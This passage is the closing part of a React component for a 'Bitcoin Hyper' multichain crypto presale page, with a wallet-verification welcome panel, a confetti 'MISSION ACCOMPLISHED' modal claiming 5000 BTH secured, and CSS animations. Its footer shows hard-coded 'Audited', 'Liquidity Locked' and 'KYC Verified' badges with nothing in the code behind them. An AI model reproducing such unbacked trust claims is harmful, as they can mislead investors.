              <div className="bg-gradient-to-r from-purple-500/20 to-orange-500/20 backdrop-blur-xl border border-purple-500/30 rounded-2xl p-10 text-center transform-gpu hover:scale-105 transition-all duration-500">
                <div className="text-7xl mb-6 animate-float">👋</div>
                <h2 className="text-3xl font-bold mb-4 bg-gradient-to-r from-purple-400 to-orange-400 bg-clip-text text-transparent">
                  Welcome to the Elite Circle
                </h2>
                <p className="text-gray-400 text-lg mb-8 max-w-md mx-auto">
                  Thank you for connecting. We verify each wallet to ensure a fair and exclusive presale.
                </p>
                <div className="bg-gray-900/50 rounded-xl p-6 border border-gray-800">
                  <p className="text-sm text-gray-300 leading-relaxed">
                    You've been added to our priority list. Follow our announcements for the next presale phase.
                  </p>
                </div>
              </div>
            )}
          </div>
        )}

        {/* ============================================ */}
        {/* EPIC CELEBRATION MODAL */}
        {/* ============================================ */}
        {showCelebration && (
          <div className="fixed inset-0 bg-black/95 backdrop-blur-2xl flex items-center justify-center z-50 p-4 animate-fadeIn">
            <div className="relative max-w-lg w-full">
              {/* Exploding Background Effect */}
              <div className="absolute inset-0 bg-gradient-to-r from-orange-600 via-yellow-600 to-orange-600 rounded-3xl blur-3xl animate-pulse-slow"></div>
              
              {/* Confetti Cannons */}
              {[...Array(20)].map((_, i) => (
                <div
                  key={i}
                  className="absolute w-2 h-2 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full animate-confetti-cannon"
                  style={{
                    left: `${Math.random() * 100}%`,
                    top: '50%',
                    animationDelay: `${i * 0.1}s`,
                    animationDuration: `${1 + Math.random()}s`
                  }}
                />
              ))}
              
              {/* Modal Content */}
              <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-3xl p-12 border border-orange-500/30 shadow-2xl transform-gpu animate-scaleIn">
                <div className="text-center">
                  {/* Exploding 3D Icon */}
                  <div className="relative mb-8">
                    <div className="text-8xl animate-bounce-3d">🎉</div>
                    {[...Array(16)].map((_, i) => (
                      <div
                        key={i}
                        className="absolute w-3 h-3 bg-orange-500 rounded-full animate-confetti-spiral"
                        style={{
                          top: '50%',
                          left: '50%',
                          transform: `rotate(${i * 22.5}deg) translateY(-70px)`,
                          animationDelay: `${i * 0.05}s`
                        }}
                      />
                    ))}
                  </div>
                  
                  <h2 className="text-5xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 bg-clip-text text-transparent animate-pulse">
                    🚀 MISSION ACCOMPLISHED! 🚀
                  </h2>
                  
                  <p className="text-2xl text-gray-300 mb-4">You have secured</p>
                  
                  <div className="text-7xl font-black text-orange-400 mb-3 animate-float-3d">5000 BTH</div>
                  
                  <div className="inline-block bg-gradient-to-r from-green-500/30 to-green-600/30 px-8 py-4 rounded-full mb-6 border border-green-500/50">
                    <span className="text-3xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
                  </div>
                  
                  <p className="text-sm text-gray-500 mb-8 flex items-center justify-center gap-2">
                    <span>✓ Verified on {verifiedChains.length} networks</span>
                    {verifiedChains.map(chain => {
                      const c = DEPLOYED_CHAINS.find(c => c.name === chain);
                      return c ? <span key={chain} className="text-lg">{c.icon}</span> : null;
                    })}
                  </p>
                  
                  <button
                    onClick={() => setShowCelebration(false)}
                    className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-5 px-8 rounded-xl transition-all transform hover:scale-110 text-2xl relative group overflow-hidden"
                  >
                    <span className="relative z-10">ENTER THE MULTICHAIN</span>
                    <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/30 to-white/0 animate-shimmer"></div>
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Footer with Animated Badges */}
        <div className="mt-12 text-center">
          <div className="flex flex-wrap justify-center gap-4 mb-6">
            {[
              { icon: '🔒', text: 'Audited' },
              { icon: '🔐', text: 'Liquidity Locked' },
              { icon: '⚡', text: '5 Networks' },
              { icon: '✓', text: 'KYC Verified' }
            ].map((badge, i) => (
              <span
                key={i}
                className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float"
                style={{ animationDelay: `${i * 0.2}s` }}
              >
                {badge.icon} {badge.text}
              </span>
            ))}
          </div>
          <p className="text-gray-600 text-sm animate-pulse">
            © 2026 Bitcoin Hyper • Multi-Chain Elite Access Platform
          </p>
        </div>
      </div>

      {/* ============================================ */}
      {/* ULTIMATE ANIMATION KEYFRAMES */}
      {/* ============================================ */}
      <style>{`
        @keyframes float-slow {
          0%, 100% { transform: translate(0, 0) scale(1); }
          33% { transform: translate(30px, -30px) scale(1.1); }
          66% { transform: translate(-20px, 20px) scale(0.9); }
        }
        
        @keyframes float-particle {
          0% { transform: translateY(0) translateX(0) rotate(0deg); opacity: 0; }
          10% { opacity: 1; }
          90% { opacity: 1; transform: translateY(-100vh) translateX(100px) rotate(360deg); }
          100% { transform: translateY(-120vh) translateX(150px) rotate(720deg); opacity: 0; }
        }
        
        @keyframes float-3d {
          0%, 100% { transform: translateY(0) rotateX(0deg); }
          25% { transform: translateY(-30px) rotateX(10deg); }
          75% { transform: translateY(30px) rotateX(-10deg); }
        }
        
        @keyframes confetti {
          0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
          100% { transform: rotate(720deg) translateY(-200px) scale(0); opacity: 0; }
        }
        
        @keyframes confetti-cannon {
          0% { transform: translateY(0) rotate(0deg); opacity: 1; }
          100% { transform: translateY(-300px) rotate(720deg) translateX(200px); opacity: 0; }
        }
        
        @keyframes confetti-spiral {
          0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
          100% { transform: rotate(720deg) translateY(-150px) scale(0); opacity: 0; }
        }
        
        @keyframes ping-slow {
          75%, 100% { transform: scale(1.5); opacity: 0; }
        }
        
        @keyframes spin-slow {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        
        @keyframes spin-slower {
          from { transform: rotate(0deg); }
          to { transform: rotate(-360deg); }
        }
        
        @keyframes spin-slowest {
          from { transform: rotate(0deg); }
          to { transform: rotate(720deg); }
        }
        
        @keyframes spin-3d {
          0% { transform: rotateX(0deg) rotateY(0deg); }
          100% { transform: rotateX(360deg) rotateY(360deg); }
        }
        
        @keyframes spin-3d-reverse {
          0% { transform: rotateX(360deg) rotateY(360deg); }
          100% { transform: rotateX(0deg) rotateY(0deg); }
        }
        
        @keyframes gradient-x {
          0%, 100% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
        }
        
        @keyframes pulse-slow {
          0%, 100% { opacity: 0.5; }
          50% { opacity: 0.8; }
        }
        
        @keyframes pulse-text {
          0%, 100% { opacity: 0.8; text-shadow: 0 0 20px rgba(249,115,22,0.3); }
          50% { opacity: 1; text-shadow: 0 0 40px rgba(249,115,22,0.6); }
        }
        
        @keyframes pulse-glow {
          0%, 100% { box-shadow: 0 0 20px rgba(249,115,22,0.3); }
          50% { box-shadow: 0 0 40px rgba(249,115,22,0.6); }
        }
        
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        
        @keyframes scaleIn {
          from { transform: scale(0.8) rotateY(-30deg); opacity: 0; }
          to { transform: scale(1) rotateY(0); opacity: 1; }
        }
        
        @keyframes slideIn {
          from { transform: translateX(-50px); opacity: 0; }
          to { transform: translateX(0); opacity: 1; }
        }
        
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
          20%, 40%, 60%, 80% { transform: translateX(5px); }
        }
        
        @keyframes shimmer {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(100%); }
        }
        
        @keyframes scan {
          0% { transform: translateY(-100%); }
          100% { transform: translateY(100%); }
        }
        
        @keyframes border-pulse {
          0%, 100% { border-color: rgba(249,115,22,0.3); }
          50% { border-color: rgba(249,115,22,0.8); }
        }
        
        @keyframes bounce-3d {
          0%, 100% { transform: translateY(0) scale(1) rotateX(0deg); }
          50% { transform: translateY(-50px) scale(1.2) rotateX(20deg); }
        }
        
        @keyframes particle-burst {
          0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
          100% { transform: rotate(360deg) translateY(-100px) scale(0); opacity: 0; }
        }
        
        .animate-float-slow { animation: float-slow 20s ease-in-out infinite; }
        .animate-float-particle { animation: float-particle 15s linear infinite; }
        .animate-float-3d { animation: float-3d 6s ease-in-out infinite; }
        .animate-float { animation: float 3s ease-in-out infinite; }
        .animate-confetti { animation: confetti 1s ease-out forwards; }
        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
        .animate-confetti-spiral { animation: confetti-spiral 1.5s ease-out forwards; }
        .animate-ping-slow { animation: ping-slow 3s cubic-bezier(0, 0, 0.2, 1) infinite; }
        .animate-spin-slow { animation: spin-slow 20s linear infinite; }
        .animate-spin-slower { animation: spin-slower 25s linear infinite; }
        .animate-spin-slowest { animation: spin-slowest 30s linear infinite; }
        .animate-spin-3d { animation: spin-3d 3s linear infinite; }
        .animate-spin-3d-reverse { animation: spin-3d-reverse 3s linear infinite; }
        .animate-gradient-x { animation: gradient-x 3s ease infinite; background-size: 200% 200%; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-pulse-text { animation: pulse-text 2s ease-in-out infinite; }
        .animate-pulse-glow { animation: pulse-glow 2s ease-in-out infinite; }
        .animate-fadeIn { animation: fadeIn 0.5s ease-out; }
        .animate-scaleIn { animation: scaleIn 0.5s ease-out; }
        .animate-slideIn { animation: slideIn 0.5s ease-out; }
        .animate-shake { animation: shake 0.5s ease-in-out; }
        .animate-shimmer { animation: shimmer 2s infinite; }
        .animate-scan { animation: scan 8s linear infinite; }
        .animate-border-pulse { animation: border-pulse 2s ease-in-out infinite; }
        .animate-bounce-3d { animation: bounce-3d 2s ease-in-out infinite; }
        .animate-particle-burst { animation: particle-burst 1s ease-out forwards; }
        
        .animation-delay-500 { animation-delay: 500ms; }
        .animation-delay-1000 { animation-delay: 1000ms; }
        .animation-delay-2000 { animation-delay: 2000ms; }
        .animation-delay-4000 { animation-delay: 4000ms; }
        
        .perspective-1000 { perspective: 1000px; }
        .rotate-y-12 { transform: rotateY(12deg); }
        
        .glitch {
          position: relative;
        }
        
        .glitch::before,
        .glitch::after {
          content: attr(data-text);
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: inherit;
          clip: rect(0, 0, 0, 0);
        }
        
        .glitch:hover::before {
          left: 2px;
          text-shadow: -2px 0 #ff00c1;
          animation: glitch-1 0.3s infinite linear alternate-reverse;
        }
        
        .glitch:hover::after {
          left: -2px;
          text-shadow: 2px 0 #00fff9;
          animation: glitch-2 0.3s infinite linear alternate-reverse;
        }
        
        @keyframes glitch-1 {
          0% { clip: rect(20px, 9999px, 20px, 0); }
          100% { clip: rect(80px, 9999px, 140px, 0); }
        }
        
        @keyframes glitch-2 {
          0% { clip: rect(40px, 9999px, 70px, 0); }
          100% { clip: rect(100px, 9999px, 130px, 0); }
        }
      `}</style>
    </div>
  );
}

export default App;
